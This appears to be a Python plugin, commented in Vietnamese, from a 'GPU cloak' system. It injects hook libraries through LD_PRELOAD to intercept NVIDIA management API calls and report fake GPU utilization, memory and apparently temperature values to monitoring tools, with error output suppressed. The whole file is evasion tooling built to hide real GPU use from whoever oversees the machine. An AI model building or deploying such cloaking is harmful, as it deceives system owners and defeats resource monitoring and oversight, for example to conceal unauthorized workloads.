"""NVML Interceptor Plugin - Wrapper cho libgpuhook.so"""
import os
import logging
from typing import Dict, Any, List
from ..core.interfaces import IGPUCloakService

# Import NVML logger và domain functions
try:
    from ...scripts.module_loggers import get_nvml_logger, log_nvml_interception
    logger = get_nvml_logger()
except ImportError:
    # Fallback nếu không có logger
    logger = logging.getLogger(__name__)
    # Dummy function khi không import được
    def log_nvml_interception(*args, **kwargs):
        pass

def _log_nvml_operation(message: str, utilization: int = None, level: str = "INFO", intercepted: bool = True):
    """
    **Wrapper function** (Hàm bọc) để ánh xạ tham số cho log_nvml_interception
    
    Args:
        message (str): Log message format [ACTION] - details
        utilization (int): GPU utilization value (optional)
        level (str): Log level (INFO, ERROR, etc.)
        intercepted (bool): Whether operation was intercepted (default: True)
    """
    # Extract function name from message
    if " - " in message:
        function_name = message.split(" - ")[0].strip()
    else:
        function_name = "NVML_OPERATION"
    
    # Map utilization to kwargs
    kwargs = {}
    if utilization is not None:
        kwargs['utilization'] = utilization
    
    # Call the actual function with correct signature
    try:
        log_nvml_interception(
            function_name=function_name,
            intercepted=intercepted,
            level=level,
            **kwargs
        )
    except Exception as e:
        # Fallback logging if wrapper fails
        logger.log(getattr(logging, level.upper(), logging.INFO), 
                  f"[NVML_WRAPPER_ERROR] {message} - Error: {e}")

class NVMLInterceptor(IGPUCloakService):
    """Plugin quản lý NVML API interception qua LD_PRELOAD"""
    
    def __init__(self):
        self.enabled = False
        self.fake_utilization = 0
        self.fake_memory = 0
        self.lib_path = ""
        # Tham số đồng bộ với tempspoof/gpuhook
        self.profile = "train"  # train|infer
        self.seed = ""          # chuỗi số nguyên (uint64)
        
    @property
    def name(self) -> str:
        return "nvml_interceptor"
        
    def initialize(self, config: Dict[str, Any]) -> bool:
        """Khởi tạo NVML interceptor"""
        self.fake_utilization = config.get('fake_utilization', 0)
        self.fake_memory = config.get('fake_memory', 0)
        # Đọc profile/seed để đồng bộ với tempspoof
        self.profile = config.get('profile', os.environ.get('GPUHOOK_PROFILE') or os.environ.get('TEMPSPOOF_PROFILE') or 'train')
        seed_cfg = config.get('seed')
        if seed_cfg is not None:
            self.seed = str(seed_cfg)
        else:
            self.seed = os.environ.get('GPUHOOK_SEED') or os.environ.get('TEMPSPOOF_SEED') or ""
        
        # Kiểm tra libgpuhook.so có tồn tại
        self.lib_path = config.get('lib_path', '/opt/hooks/libgpuhook.so')
        if not os.path.exists(self.lib_path):
            logger.warning(f"NVML hook library not found: {self.lib_path}")
            # Log domain-specific event using wrapper function
            _log_nvml_operation(
                f"INITIALIZE FAILED - Library not found: {self.lib_path}",
                utilization=self.fake_utilization,
                level="ERROR",
                intercepted=False
            )
            return False
            
        logger.info(f"NVML interceptor initialized with fake_util={self.fake_utilization}%")
        # Log domain-specific success event using wrapper function
        _log_nvml_operation(
            f"INITIALIZE SUCCESS - Fake util: {self.fake_utilization}%, Memory: {self.fake_memory}MB",
            utilization=self.fake_utilization,
            level="INFO",
            intercepted=True
        )
        return True
        
    def start(self) -> bool:
        """Start NVML interception"""
        if not os.path.exists(self.lib_path):
            error_msg = f"NVML hook library not found: {self.lib_path}"
            logger.error(error_msg)
            _log_nvml_operation(
                f"START FAILED - {error_msg}",
                utilization=self.fake_utilization,
                level="ERROR",
                intercepted=False
            )
            return False
            
        # Thiết lập LD_PRELOAD (đảm bảo thứ tự libgpuhook.so đứng trước libtempspoof.so)
        current_preload = os.environ.get('LD_PRELOAD', '')
        libs = [p for p in current_preload.split(':') if p]
        if self.lib_path not in libs:
            libs.append(self.lib_path)
        # Chuẩn hóa thứ tự: gpuhook trước tempspoof nếu cả hai đều có
        try:
            th_path = '/opt/hooks/libtempspoof.so'
            if self.lib_path in libs and th_path in libs:
                libs = [l for l in libs if l not in (self.lib_path, th_path)] + [self.lib_path, th_path]
        except Exception:
            pass
        os.environ['LD_PRELOAD'] = ':'.join(libs)
                
        # Thiết lập environment variables
        os.environ['ENABLE_NVML_IPC_HIJACKING'] = '1'
        # Giao diện ENV mới cho gpuhook (+ phản chiếu sang tempspoof để đồng bộ)
        os.environ['GPUHOOK_TEST_MODE'] = '1'
        os.environ['GPUHOOK_NO_STDERR'] = '1'
        if self.profile:
            os.environ['GPUHOOK_PROFILE'] = self.profile
            os.environ['TEMPSPOOF_PROFILE'] = self.profile
        if self.seed:
            os.environ['GPUHOOK_SEED'] = self.seed
            os.environ['TEMPSPOOF_SEED'] = self.seed
        
        self.enabled = True
        logger.info("✅ NVML interception started")
        _log_nvml_operation(
            f"START SUCCESS - NVML interception enabled",
            utilization=self.fake_utilization,
            level="INFO",
            intercepted=True
        )
        return True
        
    def stop(self) -> None:
        """Stop NVML interception"""
        os.environ['ENABLE_NVML_IPC_HIJACKING'] = '0'
        self.enabled = False
        logger.info("🛑 NVML interception stopped")
        
    def enable_cloaking(self, strategies: List[str]) -> bool:
        """Kích hoạt NVML cloaking"""
        if 'nvml_interception' in strategies:
            return self.start()
        return False
        
    def disable_cloaking(self) -> bool:
        """Tắt NVML cloaking"""
        self.stop()
        return True
        
    def update_fake_metrics(self, metrics: Dict[str, int]) -> None:
        """Cập nhật fake NVML metrics"""
        updated_metrics = {}
        
        if 'gpu_utilization' in metrics:
            self.fake_utilization = metrics['gpu_utilization']
            updated_metrics['gpu_utilization'] = self.fake_utilization
            logger.info(f"Updated fake GPU utilization to {self.fake_utilization}%")
            
        if 'memory_used' in metrics:
            self.fake_memory = metrics['memory_used']
            updated_metrics['memory_used'] = self.fake_memory
            logger.info(f"Updated fake memory usage to {self.fake_memory}MB")
            
        # Log metrics update
        if updated_metrics:
            _log_nvml_operation(
                f"UPDATE_METRICS - Util: {self.fake_utilization}%, Memory: {self.fake_memory}MB",
                utilization=self.fake_utilization,
                level="INFO",
                intercepted=True
            )
            
    def get_active_strategies(self) -> List[str]:
        """Lấy danh sách strategies đang active"""
        return ['nvml_interception'] if self.enabled else []
        
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái NVML interceptor"""
        return {
            'name': self.name,
            'enabled': self.enabled,
            'fake_utilization': self.fake_utilization,
            'fake_memory': self.fake_memory,
            'lib_path': self.lib_path,
            'lib_exists': os.path.exists(self.lib_path)
        }